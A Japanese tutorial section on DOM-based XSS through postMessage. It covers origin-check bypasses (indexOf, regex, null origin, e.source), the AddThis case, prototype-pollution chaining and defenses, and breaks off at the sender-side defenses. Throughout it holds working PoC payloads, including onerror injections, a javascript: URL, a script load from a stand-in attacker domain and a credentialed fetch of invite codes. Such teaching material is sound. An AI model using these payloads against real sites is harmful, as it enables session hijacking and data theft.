## postMessage経由のDOM XSS

反射型XSS（サーバがユーザー入力をそのままHTMLに埋め込んで返してしまうタイプ）を卒業した学習者が次に必ずぶつかるのが、**クライアント側だけで完結するXSS**、すなわちDOMベースXSSです。その中でも `postMessage` を悪用するものは、次の三つの理由から現代のバグバウンティで極めて重要度が高い領域になっています。

1. **サーバのレスポンスを一切書き換えなくても成立する。** ペイロードは `event.data`（後述）というJavaScriptのオブジェクトとしてブラウザ内部を流れるため、WAF（Web Application Firewall。HTTPリクエスト/レスポンスを検査してXSS等をブロックする防御機構）やサーバ側フィルタの多くを素通りします。
2. **窓（ウィンドウ）やiframeをまたぐ「信頼境界」の設計ミスを突く。** 攻撃対象のサイトそのものではなく、そこに埋め込まれた広告・SNSシェアボタン・チャットウィジェット・OAuthポップアップなどの `postMessage` 実装が穴になることが多く、**第三者スクリプト（サードパーティスクリプト）経由で数百万サイトが一括で脆弱になる**という破壊力を持ちます（本節の実例で扱う AddThis はまさにこれです）。
3. **一見「ちゃんとチェックしている」コードでもバイパスできる。** `indexOf` や正規表現による中途半端なオリジン検証は、ブラウザやJavaScriptの言語仕様の挙動を突いて破れます。ここに、この教科書が最も価値を置く「なぜそうなるのか」の原理が詰まっています。

このセクションでは、まず `postMessage` API そのものの仕組みを土台から説明し、脆弱性の本質（どこで信頼境界が破れるのか）を明らかにします。次に AddThis の実例で「本物の被害」を体感し、その後にオリジン検証バイパスの各テクニックを**仕組みのレベルで**分解します。最後にプロトタイプ汚染やCSPと組み合わせた高度な連鎖、発見のワークフロー、そして正しい防御策までを一気通貫で扱います。

> ⚠️ **未取得の資料**: 本節が主資料とした3件のURL（YesWeHack / Detectify / Intigriti）は、いずれも実行環境のネットワーク送信プロキシ（egress proxy）によって直接取得がブロックされました（理由: EGRESS_BLOCKED）。そのため以下の本文は、各記事のミラー（GitHub上のHackTricksミラー、PayloadsAllTheThings 等）および複数の二次言及・検索スニペットから内容を再構成したものです。正確な原文・最新の記述は、以下の各URLからユーザーご自身で直接ご確認ください。
> - postMessage脆弱性入門: https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> - AddThis 100万サイトのpostMessage XSS: https://labs.detectify.com/writeups/postmessage-xss-on-a-million-sites/
> - postMessage脆弱性の高度な連鎖: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities

（以下は、取得できなかった上記資料の内容を、ミラー・二次資料・一般的な専門知識に基づいて再構成・補足した解説です。原文の一字一句の再現ではない点にご留意ください。）

---

### postMessage APIの基礎 — なぜ「窓をまたぐ通信」が必要なのか

#### 出発点: 同一オリジンポリシー（Same-Origin Policy, SOP）

ブラウザには **同一オリジンポリシー（Same-Origin Policy。以下SOP。あるオリジンのページのスクリプトが、別オリジンのページの中身やDOMに勝手にアクセスするのを禁止するセキュリティの大原則）** があります。ここでいう **オリジン（origin）** とは「スキーム（http/https）＋ホスト名＋ポート番号」の三つ組のことで、この三つが完全に一致して初めて「同一オリジン」とみなされます。たとえば `https://example.com` と `https://sub.example.com` はホスト名が違うので別オリジン、`https://example.com` と `http://example.com` はスキームが違うので別オリジンです。

SOPがあるおかげで、悪意あるサイト `attacker.com` の中に開いた `bank.com` のiframeの中身を、`attacker.com` のスクリプトが読み取ることはできません。しかし現実のWebアプリは、**あえてオリジンをまたいで安全にデータをやり取りしたい**場面が山ほどあります。たとえば、

- 親ページと、その中に埋め込んだ別オリジンのiframe（決済ウィジェット、地図、SNSシェアボタン、動画プレイヤー）が連携したい
- OAuth認証で開いたポップアップ窓（`window.open` で開いた認可サーバの画面）が、認証完了を親ページに知らせたい
- 別ドメインのチャットウィジェットが、親ページに「新着メッセージあり」を通知したい

こうした「SOPの壁を越えた、意図的で安全な通信路」を提供するために用意されたのが `window.postMessage()` です。

#### 送信側の構文

送信は次の形で行います。

```javascript
targetWindow.postMessage(message, targetOrigin, [transfer]);
```

- **`targetWindow`**: メッセージの送り先となる別のウィンドウオブジェクト。`iframe.contentWindow`（埋め込みiframe）、`window.open(...)` の戻り値（開いたポップアップ）、`window.parent`（自分を埋め込んでいる親）、`window.opener`（自分を開いた元の窓）などを指します。
- **`message`**: 送るデータ。文字列でも、構造化クローンアルゴリズムでコピー可能なオブジェクト（配列・プレーンオブジェクトなど）でも渡せます。
- **`targetOrigin`**: **「このオリジンのウィンドウにしか配達するな」という指定。** ここに `'https://trusted.example.com'` のように具体的オリジンを書くと、受信側の現在のオリジンがそれと一致したときだけメッセージが届きます。`'*'`（ワイルドカード）を書くと**任意のオリジンに配達される**ため、後述するとおり情報漏洩の温床になります。

例:

```javascript
// iframe に送る
document.getElementById('child').contentWindow.postMessage(
  { type: 'update', value: 42 },
  'https://widget.example.com'   // 具体オリジン指定（推奨）
);

// ポップアップに送る
const win = window.open('https://auth.example.com/login');
setTimeout(() => win.postMessage('ready', '*'), 2000); // '*' は危険
```

#### 受信側の構文 — ここに脆弱性が宿る

受信側は `message` イベントを購読（リッスン）します。

```javascript
window.addEventListener("message", (event) => {
  // event.origin : メッセージの「送信元オリジン」。ブラウザが自動でセットするため偽装できない
  // event.data   : 送られてきたデータ本体（taint source = 汚染源）
  // event.source : 送ってきたウィンドウオブジェクトへの参照
  if (event.origin !== "https://trusted.example.com") return; // オリジン検証
  console.log(event.data);
}, false);
```

ここで押さえるべき三つのプロパティが、そのまま攻防の焦点になります。

- **`event.origin`**: メッセージを送ってきた窓のオリジン。**この値は送信側のJavaScriptからは改竄できず、ブラウザが真実の値を入れてくれます。** だからこそ「本当に信頼できる相手からのメッセージか」を判定する唯一の確実な材料であり、これを**チェックし忘れる／甘くチェックする**ことがpostMessage XSSのほぼ全ての根本原因です。
- **`event.data`**: 送られてきたデータ。攻撃者が完全にコントロールできる **taint source（汚染源。ユーザー/攻撃者が制御でき、これがそのまま危険な処理に流れ込むとXSSになる入力の源泉）** です。
- **`event.source`**: 送ってきたウィンドウへの参照。「返信」に使えるほか、送信元の同一性チェックに使われることがあります（これも後述のとおりバイパス可能）。

> 出典: postMessage脆弱性入門（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、Intigriti記事のミラー的資料） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 脆弱性の本質 — 二つの信頼境界が破れる

postMessageのセキュリティは「送信側」と「受信側」の二つの信頼境界からなり、それぞれ別種の脆弱性を生みます。

#### 受信側の欠陥（DOM XSSの主因）: オリジン検証の欠如

受信側の `message` ハンドラが `event.origin` を検証しないと、**世界中のどのサイトからでも** そのハンドラを起動できます。攻撃者は自分の用意したページ（`attacker.com`）に被害サイトをiframeで読み込むか、`window.open` で開き、そこへ任意の `event.data` を送りつけられます。

このとき `event.data` が **sink（シンク。ユーザー入力が最終的に実行・解釈されてしまう危険な代入先・実行点。DOM XSSの「着弾点」）** に無防備に流れ込むと、DOMベースXSSが成立します。代表的なsinkは次のとおりです。

- `element.innerHTML = event.data;` — 文字列がHTMLとしてパースされ、`<img src=x onerror=...>` などのイベントハンドラが発火
- `eval(event.data)` / `Function(event.data)()` / `setTimeout(event.data)` — 文字列がJavaScriptとして実行される
- `document.write(event.data)` — 文書ストリームにHTMLとして書き込まれる
- `location = event.data` / `location.href = event.data` — `javascript:` スキームを入れるとスクリプト実行
- `element.setAttribute('src', event.data)` を `<script>` や `<iframe>` に対して行う、`jQuery(event.data)` に渡す、など

最小限の脆弱なコードは次の通りです。

```javascript
// 脆弱: origin検証が一切ない
window.addEventListener("message", function (event) {
    document.body.innerHTML = event.data;  // sink = innerHTML
});
```

これに対する攻撃ページ（PoC）は次のようになります。

```html
<!-- attacker.com/exploit.html -->
<iframe src="https://victim.com/page-with-listener"
        onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')">
</iframe>
```

**なぜ動くのか**: iframeの `onload` で被害ページのロード完了を待ち、`contentWindow.postMessage(...)` で被害ページ内のリスナーへ文字列を送り込みます。被害ページはオリジンを確認しないため攻撃者からのメッセージを受理し、`innerHTML` に代入します。ブラウザのHTMLパーサはこの文字列を要素として解釈し、`<img>` の画像読み込みに失敗した瞬間 `onerror` 属性のJavaScriptを**被害ページのオリジン `victim.com` の権限で**実行します。`alert(document.domain)` が `victim.com` を表示すれば、攻撃者のスクリプトが被害オリジンで動いた＝XSS成立、という証明になります。送信側の `targetOrigin` に `'*'` を使っているのは、攻撃者は被害ページの正確なオリジンさえ書けば良く、`'*'` でも問題なく届くからです。

> 出典: postMessage脆弱性入門（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> 出典: Post Message XSS（HowToHunt, KathanP19、二次資料） — https://github.com/KathanP19/HowToHunt/blob/master/XSS/post_message_xss.md

YesWeHackの入門記事では、これをより現実的な題材で説明しています。あるゲーム風のデモページ（`rewards.html` と `start.html`）で、ユーザーが「Play」ボタンを押すと `pop1()` という関数が呼ばれ、`postMessage` で別ページへイベントが飛びます。受信側は「メッセージは自分のドメイン（例: `127.0.0.1`）から届くはずだ」と暗黙に前提しているのに、**送信元オリジンを検証していない**ため、攻撃者は同じ形のコードを自分のドメインに置き、`message` の中身を悪意あるJavaScriptペイロードに差し替えて送り込めば、被害ページ側でそれが処理されてしまう——という筋書きです。ポイントは「HTML5のpostMessageは `Event.data` を新たなtaint sourceとして持ち込む。これが安全でない形で扱われた瞬間にDOMベースXSSが発生する」という一般則です。

#### 送信側の欠陥: ワイルドカード `targetOrigin='*'` による情報漏洩

受信側だけでなく送信側にも罠があります。`postMessage(secret, '*')` のように `targetOrigin` を `'*'` にすると、**メッセージは配達先ウィンドウの現在のオリジンが何であっても配達されます。** つまり、攻撃者が被害ページを乗っ取って（あるいはiframeのlocationを差し替えて）配達先のオリジンを攻撃者オリジンに変えられる状況では、本来秘密であるはずのデータ（認証トークン、ユーザー情報など）が攻撃者に流出します。

PayloadsAllTheThings に載っている典型的なPoCは、この「送信側の緩さ」と「受信側でJSスキームがsinkに流れる」ことを組み合わせています。

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>
<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://10.10.10.10/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')"
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

**なぜ動くのか**: 攻撃ページが被害アプリを `window.open` で開き、2秒待ってから `postMessage` で `{sender:"accounts", url:"javascript:confirm('XSS')"}` を送ります。被害アプリのリスナーが「`sender` が `accounts` なら `url` を信頼してリダイレクトに使う」ような実装で、しかも `location = msg.url` のようにsinkへ流していると、`javascript:` スキームのURLがナビゲーションとして評価され、被害オリジンでJavaScriptが走ります。ここでも受信側がオリジンを検証していないことが前提です。

> 出典: PayloadsAllTheThings — XSS Injection（swisskyrepo、二次資料） — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

#### 安全なコードとの対比

上記の脆弱例に対して、最低限守るべき安全形は次の通りです（詳細は本節末尾の防御策で展開します）。

```javascript
window.addEventListener("message", (event) => {
  // 1) 送信元オリジンを「完全一致」で許可リスト照合する
  if (event.origin !== "https://trusted.example.com") return;
  // 2) データの「形」を検証する（型・キー・値の範囲）
  let data;
  try { data = JSON.parse(event.data); } catch { return; }
  if (typeof data !== "object" || data.type !== "update") return;
  // 3) 危険なsinkには渡さない（innerHTML/eval等を避け、textContent等を使う）
  document.getElementById("status").textContent = String(data.value);
});
```

---

### 実例: AddThis 経由で100万サイトに影響した postMessage XSS

ここまでの原理が「机上の空論ではない」ことを、Detectify Labs の Mathias Karlsson が2016年12月15日に公開した実例で確認します。

#### 何が起きたか

**AddThis** は、ブログや記事の末尾によくある「SNSシェアボタン」を提供する第三者ウィジェットで、当時**100万を超えるサイト**に埋め込まれていました。AddThisのスクリプトを読み込んでいたそれら全サイトが、一斉に **DOMベースXSSに対して脆弱**だった、というのがこの事例の衝撃です。攻撃者はAddThisを使っている任意のページに、自分の好きなスクリプトを差し込めました。

#### 脆弱性の核心: 甘すぎるオリジン検証

AddThisの `postMessage` リスナーは、**送信元オリジンについて「HTTP/HTTPSのページであること」しか確認していませんでした。** つまり `event.origin` が `http://` か `https://` で始まりさえすれば、どのドメインからのメッセージでも受理してしまう——これは事実上「誰でもOK」に等しい、名ばかりの検証です。攻撃者のサイトも当然HTTPSで配信されるからです。

さらにリスナーは、受け取ったメッセージが `at-share-bookmarklet:DATA` という形式であることを期待しており、`DATA` の部分を使って**外部からスクリプトファイルを読み込む**動作をしました（AddThisのブックマークレット共有機能に由来する挙動）。オリジンが実質ノーチェックなので、この `DATA` に攻撃者のスクリプトURLを入れれば、被害ページがそれをロードして実行してしまいます。

#### エクスプロイト

再構成された攻撃の骨子は次の通りです。

```html
<!-- attacker.com: AddThisを読み込む任意の被害ページを frame に入れて postMessage -->
<iframe id="frame" src="https://victim.com/page-that-uses-addthis"></iframe>
<script>
  // ページロード後、AddThisのリスナー宛てにブックマークレット形式のメッセージを送る
  setTimeout(function () {
    document.getElementById('frame').contentWindow.postMessage(
      'at-share-bookmarklet://ATTACKERDOMAIN/xss.js',  // DATA = 攻撃者のスクリプトURL
      '*'
    );
  }, 3000);
</script>
```

**なぜ動くのか**: 被害ページ内で動いているAddThisのリスナーは、`event.origin` がHTTP(S)でありさえすれば受理します（攻撃者ページもHTTPSなので通過）。受理したメッセージが `at-share-bookmarklet:` で始まると、AddThisはその後続部分 `//ATTACKERDOMAIN/xss.js` を「読み込むべきスクリプトの場所」として解釈し、`xss.js` を被害ページのコンテキストで読み込み・実行します。結果として、攻撃者の任意JavaScriptが `victim.com` のオリジン権限で走り、Cookieの窃取・セッション乗っ取り・ページ改竄など何でもできてしまいます。1つの第三者スクリプトの検証漏れが、それを貼っている100万サイト全てのXSSに直結した、というのがこの事例の核心です。

#### 修正と教訓

修正は単純で、**未知のオリジンからのメッセージを弾く、まっとうなオリジン検証（許可リスト）を追加する**というものでした。AddThisのCTOに報告され、パッチは速やかに開発・配信されました。

Karlssonがこの記事で繰り返し強調する結論はこうです。**「第三者スクリプトを使うなら、そのスクリプト自身とその `postMessage` 実装を必ず精査せよ」。** 自社コードがどれだけ堅牢でも、貼り付けた広告・解析・シェアボタンのウィジェットが穴だらけなら、あなたのサイトのユーザーはそのまま危険にさらされます。攻撃対象を探すバグハンター視点で言えば、「広く使われている埋め込みウィジェットの `postMessage` リスナー」は、1つ落とせば大量のサイトに効く、費用対効果が極めて高いターゲットだということです。

> 出典: postMessage XSS on a million sites（Detectify Labs, Mathias Karlsson, 2016-12-15） — https://labs.detectify.com/writeups/postmessage-xss-on-a-million-sites/

---

### オリジン検証バイパス — 「一応チェックしている」を破る原理

多くの実装は `event.origin` を全く見ないわけではなく、「見てはいるが甘い」ことが問題です。ここが本節で最も原理的に面白い部分で、**JavaScriptの文字列メソッドや正規表現の仕様、ブラウザのオリジン割り当ての挙動**を突いてバイパスします。攻撃者がやるべきことは常に一つ、「そのチェックを**通ってしまう**オリジンを、自分が支配下に置ける形で用意する」ことです。

#### 1. `indexOf()` / 部分文字列マッチの罠

```javascript
// 脆弱: 「trustedドメインを含んでいればOK」という部分一致
window.addEventListener("message", (e) => {
  if (e.origin.indexOf("trusted.com") === -1) return;  // または !== 0
  document.body.innerHTML = e.data;
});
```

`String.prototype.indexOf` は「部分文字列がどこかに含まれるか」を返すだけです。したがって攻撃者は、**許可文字列を部分文字列として含むオリジン**を用意すれば通過できます。

- `indexOf("trusted.com") !== -1`（どこかに含まれればOK）の場合 → `https://trusted.com.attacker.com` や `https://attacker.com/?trusted.com` のようなドメイン/URLで通過。前者は `trusted.com` を接頭辞に持つ攻撃者管理ドメインです。
- `indexOf("https://app.marketo.com") === 0`（＝先頭一致 `startsWith` 相当）の場合でも、HackTricksが挙げる有名な例のように、`"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")` は `0` を返します。つまり `https://app-sj17.ma`（`.ma` はモロッコのTLD）という**実在しうる短いドメインで先頭一致を満たせる**わけです。

**なぜ動くのか**: `indexOf` はオリジンを「意味のある境界（ドット区切りのラベル）」として扱わず、ただのバイト列として部分一致を見るだけだからです。ドメインは右から左に階層が決まる（`a.b.com` の所有権は `b.com` の持ち主に属する）のに、部分文字列マッチはその構造を完全に無視します。

#### 2. 正規表現の落とし穴（`search()` と未エスケープのドット）

```javascript
// 脆弱: search() に「文字列」を渡している
if ("https://www.trusted.com".search(userOriginPattern) ) { ... }
// あるいは自前の正規表現でドットをエスケープしていない
const re = /^https:\/\/www.trusted.com$/;   // '.' が未エスケープ
if (re.test(e.origin)) { ... }
```

二つの別々のバグが同じ原理に帰着します。

- **`String.prototype.search()` は引数を正規表現として解釈します。** 文字列を渡しても暗黙に `RegExp` へ変換されるため、`.` などの正規表現メタ文字がそのまま特別扱いになります。HackTricksの例では `"https://www.safedomain.com".search("www.s.fedomain.com")` がマッチしてしまいます。
- **正規表現内の `.` は「任意の1文字」にマッチするワイルドカード**です。`/^https:\/\/www.trusted.com$/` は開発者の意図では `www.trusted.com` を表すつもりでも、実際には `www` の後の `.` が任意文字にマッチするため、`https://wwwXtrusted.com` のようなドメインでも通ります（`X` は任意の1文字）。攻撃者は `wwwatrusted.com` のような**別ドメインを取得**すれば検証を突破できます。同様に、末尾を `$` で固定していない `/^https:\/\/trusted\.com/` は `https://trusted.com.attacker.com` を許してしまいます。

**なぜ動くのか**: ドメイン名の照合を「正規表現の文字クラスとして」書いてしまうと、ドメインの区切り文字であるはずの `.` が、正規表現の世界では「なんでもいい1文字」という真逆の意味を持つからです。名前空間（ドメイン階層）の意味論と、正規表現のパターンマッチの意味論が食い違うところに穴が生まれます。

#### 3. `startsWith` / `endsWith` の誤用

```javascript
if (e.origin.startsWith("https://trusted.com")) { ... }  // → https://trusted.com.evil.com が通る
if (e.origin.endsWith("trusted.com")) { ... }            // → https://nottrusted.com が通る
```

**なぜ動くのか**: `startsWith` は右側に何が続いても許すのでサブドメイン偽装（`trusted.com.evil.com`）を許し、`endsWith` は左側に何が付いても許すので接頭辞偽装（`nottrusted.com`、`eviltrusted.com`）を許します。ドメインの所有権境界（ラベル境界の `.`）を見ないチェックは、方向を問わず必ず破れます。正しくは「**完全一致**」か「厳密なラベル境界を考慮した許可リスト照合」でなければなりません。

#### 4. `null` オリジン — サンドボックス化iframeの悪用

`event.origin` が信頼される正規の値そのものと一致するかを見る実装、特に `e.origin === window.origin`（＝「自分自身と同じオリジンからのメッセージか」）という比較にも抜け道があります。

```html
<iframe sandbox="allow-scripts allow-popups" src="https://victim.example/iframe.php"></iframe>
```

**なぜ動くのか**: `sandbox` 属性付きのiframeは、`allow-same-origin` を付けない限り**オリジンが `null` になります**。さらに `allow-popups-to-escape-sandbox` が無い状態でそのサンドボックス内から `window.open` でポップアップを開くと、ポップアップもサンドボックスと `null` オリジンを継承します。すると、そのポップアップ内で動くページから見た `window.origin` は `"null"`、送ってくるメッセージの `e.origin` も `"null"` になり、`e.origin === window.origin`（`"null" === "null"`）が**成立してしまいます**。攻撃者はこの `null` 同士の一致を使って「同一オリジン限定」のつもりの検証をすり抜けます。

#### 5. `e.source` チェックの `null` 化

一部の実装は「送ってきた窓が、自分が知っている窓（例: 自分が開いたiframe）と同一か」を `e.source` で確認します。

```javascript
if (e.source !== myIframe.contentWindow) return;  // 送信元ウィンドウの同一性チェック
```

これも回避可能です。**postMessageを送った直後に、送信元のiframeをDOMから削除する**と、受信側が `message` イベントを処理する頃には送信元ウィンドウが破棄され、`e.source` が `null` になります。攻撃者は比較対象の期待値も `null` になるよう仕向けたり、単に `e.source` ベースの分岐を無効化したりできます。

**なぜ動くのか**: `e.source` はライブなウィンドウ参照であり、そのウィンドウ（iframe）が消滅すると参照は `null` に落ちます。イベントの発火と処理の間にわずかな時間差があることを突いた、レースコンディション的なトリックです。

#### 6. サニタイズ関数（`escapeHtml`）自体のバイパス

「`event.data` を innerHTML に入れる前に自前の `escapeHtml` でエスケープしているから安全」という実装すら、関数の作りによっては破れます。HackTricmのミラーが挙げる例では次のようになります。

```javascript
// 期待どおり動くケース（プレーンオブジェクト）
result = u({message: "'\"<b>\\"});
result.message // => "&#39;&quot;&lt;b&gt;\"   （エスケープされる）

// バイパス（File や Error オブジェクトを渡す）
result = u(new Error("'\"<b>\\"));
result.message; // => "'"<b>\"                 （エスケープされない！）
```

**なぜ動くのか**: この種のエスケープ関数は、オブジェクトの各プロパティに対して `hasOwnProperty`（自分自身が直接持つプロパティかどうかの判定）でフィルタしてからエスケープする作りになっていることがあります。`File` や `Error` のようなビルトインオブジェクトの `message` は、その判定に期待どおり応答しない（プロトタイプ側のアクセサ経由であるなど）ため、**エスケープ処理のループから漏れて生の値が残ります**。攻撃者は「サニタイズ関数が想定していない型のオブジェクト」を `event.data` として送り込むことで、エスケープをすり抜けたペイロードをsinkへ届けます。

> なお、サニタイザのバイパスはライブラリのバージョンに強く依存します。たとえば著名なHTMLサニタイザ **DOMPurify** は、mutation XSS（mXSS。ブラウザがHTMLを再パースする際に文字列が別の意味の要素へ「変異」して解釈され、サニタイズをすり抜ける攻撃）を突く複数のバイパスが過去に報告され、**2.0.17 など特定バージョンで順次修正**されてきました。`event.data` をサニタイズしてからsinkに渡す設計を評価する際は、**どのサニタイザの、どのバージョンを使っているか**を必ず確認してください。古いバージョンには公開済みの回避手法が存在し得ます（陳腐化への注意: 個々のバイパスは修正されるため、常に対象バージョンと公開年をセットで捉えること）。

> 出典: postMessage脆弱性の高度な連鎖（Intigriti） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、上記Intigriti記事に対応するミラー的資料。indexOf/search/null origin/e.source/escapeHtml バイパスの各コード例の出所） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 高度な連鎖 — postMessage × プロトタイプ汚染 × CSP

上級者向けの実戦では、postMessageは「単独でXSSに至らないとき」に他の脆弱性クラスと連鎖させます。Intigritiの記事（およびそのミラー）が示す代表的な2パターンを解説します。

#### プロトタイプ汚染からのXSS

**プロトタイプ汚染（Prototype Pollution）** とは、JavaScriptの全オブジェクトが共有する大元のプロトタイプ（`Object.prototype`）を、`__proto__` というキーを通じて攻撃者が書き換えてしまう脆弱性です。JavaScriptでオブジェクトのプロパティを参照すると、そのオブジェクト自身に無ければ**プロトタイプチェーンを上へ辿って**探しにいきます。したがって `Object.prototype` に細工したプロパティを仕込むと、**アプリ内のあらゆるオブジェクトがそのプロパティを「持っているかのように」振る舞い**、後続の描画ロジックがそれを読み出してsinkに流すとXSSになります。

postMessageは、この汚染を注入する経路になり得ます。受信側が `event.data` を `JSON.parse` して既存オブジェクトへ再帰的にマージするような実装だと、`__proto__` 入りのJSONを送るだけで汚染できます。

```html
<html>
<body>
    <iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
        function get_code() {
            document.getElementById('idframe').contentWindow.postMessage(
                '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(r=>r.json()).then(d=>{alert(d[\'result\'][0][\'code\']);})\\" />"}}}',
                '*'
            );
            document.getElementById('idframe').contentWindow.postMessage(JSON.stringify("refresh"), '*');
        }
        setTimeout(get_code, 2000);
    </script>
</body>
</html>
```

**なぜ動くのか**: 1通目のメッセージで `{"__proto__":{"editedbymod":{"username":"<img ... onerror=...>"}}}` を送ると、受信側の再帰マージが `Object.prototype.editedbymod.username` に攻撃者のHTMLペイロードを書き込みます（プロトタイプ汚染）。以後、アプリ内のどのオブジェクトでも `obj.editedbymod.username` を読むとこのペイロードが返ります。2通目の `"refresh"` でアプリに再描画を促すと、描画ロジックが汚染された `username` を読み出して innerHTML 系のsinkに差し込み、`<img onerror>` が発火。ここでは `same-origin` のfetchで招待コード（invitecodes）APIを叩き、結果を `alert` に出す——という情報窃取まで一気に連鎖しています。postMessageが「汚染の注入口」、プロトタイプ汚染が「ペイロードの潜伏場所」、再描画が「sinkへの着火」という三段構えです。

#### CSPの `unsafe-eval` を利用した実行

**CSP（Content Security Policy。ページが読み込む/実行するリソースの出所をブラウザに制限させるヘッダベースの防御）** が効いていると、単純な `<script>` 注入は止められることがあります。しかしCSPに `script-src 'unsafe-eval'` が含まれていると、`eval()` や `Function()` による文字列→コード実行が許可されたままになります。Intigritiが示すCTF系の例では、正しいpostMessageチャネル経由で送ったコードが、`unsafe-eval` が有効なために `eval` 相当の処理で自動評価され、XSSが成立しました。

**なぜ動くのか**: CSPはソース許可リスト（どのオリジンのスクリプトを、どういう方法で実行してよいか）を上から評価しますが、`'unsafe-eval'` はそのリストに「文字列からのコード生成を許す」という抜け穴を明示的に開けてしまいます。postMessageのsinkが `eval(event.data)` 系であれば、CSPがあっても `'unsafe-eval'` の存在ゆえに素通しになります。CSPを回避するのではなく、**CSPの設定不備そのものを利用する**連鎖です。

> 出典: postMessage脆弱性の高度な連鎖（Intigriti） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、プロトタイプ汚染PoCコードの出所） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 発見のワークフロー — ハンティングの実務

postMessage脆弱性を実地で探す手順を、Intigriti/HackTrick系資料に基づいて整理します。

#### 1. メッセージリスナーを列挙する

対象ページを開き、ブラウザの開発者ツールのコンソールで次を実行します（Chrome系の場合）。

```javascript
getEventListeners(window)
```

`message` のエントリがあれば、その `listener` 関数のソースを展開して中身を読みます。GUIからは「Elements → 対象要素/window → Event Listeners タブ」でも確認できます。ソースコード（バンドルされたJS）に対しては、次のキーワードで grep します。

```
addEventListener("message"    /  addEventListener('message'
onmessage =
$(window).on("message"        （jQuery 経由）
```

#### 2. ハンドラを静的解析する（3つの問い）

見つけた `message` ハンドラごとに、次を確認します。

1. **オリジン検証はあるか、そして厳密か？** `event.origin` を一切見ていない／`indexOf`・`search`・`startsWith`・`endsWith`・未エスケープの正規表現で見ている、なら要注意（前節の各バイパスが適用できる）。
2. **`event.data` はどのsinkに到達するか？** `innerHTML`、`outerHTML`、`document.write`、`eval`/`Function`/`setTimeout(str)`、`location`/`location.href`、`element.src`（script/iframe）、`jQuery(...)`、`postMessage` の再送、`JSON.parse` 後の再帰マージ（プロトタイプ汚染）などへ流れていないか。
3. **データの「形」の検証はあるか？** 型・キー名・値の範囲チェックが無ければ、攻撃者は自由な `event.data` を送れる。

#### 3. PoCを組み立てる

対象ページがiframe埋め込みを禁止しているか（`X-Frame-Options` や CSP `frame-ancestors`）で手法を選びます。

- **iframe可の場合**: `<iframe src="victim" onload="this.contentWindow.postMessage(PAYLOAD,'*')">`
- **iframe不可（X-Frame-Options等あり）の場合**: `window.open` で新規タブに開く。

```html
<script>
  var w = window.open("https://victim.com/target");
  setTimeout(function () { w.postMessage(PAYLOAD, '*'); }, 2000);
</script>
```

**なぜ `window.open` で回避できるのか**: `X-Frame-Options` / `frame-ancestors` は「他サイトにiframeとして**埋め込まれる**こと」だけを防ぐ指定であり、`window.open` による**トップレベルの別窓表示**は妨げません。postMessageはトップレベル窓に対しても送れるため、埋め込み制限があってもハンドラは叩けます。

#### 4. 補助ツール

- **posta**（`benso-io/posta`）: ページ内の全postMessage通信を傍受・可視化し、リスナーの列挙やメッセージの再送（リプレイ）を支援。
- **postMessage-tracker**（`fransr/postMessage-tracker`）: 送受信されるメッセージと、それを処理するリスナーのスタックトレースを追跡するブラウザ拡張。

これらを使うと「どんなメッセージが、どのリスナーに、どう処理されているか」を実行時に観測でき、静的解析だけでは見落とすsinkへの経路を発見しやすくなります。

> 出典: postMessage脆弱性の高度な連鎖（Intigriti、発見手法・PoC構成） — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、getEventListeners / posta / postMessage-tracker / window.open 回避の出所） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 防御策 — 正しい postMessage の書き方

最後に、これまでのバイパス手法を踏まえて「破れない」実装原則をまとめます。ポイントは**受信側・送信側の両方**を固めることです。

#### 受信側（最重要）

1. **オリジンは必ず「完全一致」で許可リスト照合する。** `indexOf`・`search`・`startsWith`・`endsWith`・正規表現による部分/曖昧一致は使わない。どうしても複数オリジンを許すなら、正規化した文字列の**完全一致の集合**で判定する。

   ```javascript
   const ALLOWED = new Set(["https://trusted.example.com", "https://widget.example.com"]);
   window.addEventListener("message", (event) => {
     if (!ALLOWED.has(event.origin)) return;   // 完全一致のみ
     // ...
   });
   ```

   **なぜこれで安全か**: `Set.has` はオリジン文字列の完全一致だけを真とするため、部分文字列偽装・サブドメイン偽装・正規表現ワイルドカードのいずれも成立しません。ドメインの所有権境界を文字列全体で判定していることになります。

2. **`event.data` の「形」を検証する。** 期待する型・キー・値域を明示的にチェックし、想定外のオブジェクト（`File`/`Error` など）や余分なキー（`__proto__` など）を拒否する。JSONをパースする場合は、再帰マージで `__proto__`/`constructor`/`prototype` を無視する安全なマージ関数を使う（プロトタイプ汚染対策）。

3. **危険なsinkを使わない。** `innerHTML`/`document.write`/`eval`/`Function`/`setTimeout(文字列)`/`location=` に `event.data` を直接渡さない。テキスト表示なら `textContent`、DOM生成なら安全なAPI（`createElement` + 属性の個別設定）を使う。サニタイズが必要なら**最新の**専用ライブラリ（DOMPurifyの最新版など）を用い、自前の `escapeHtml` に頼らない。

#### 送信側

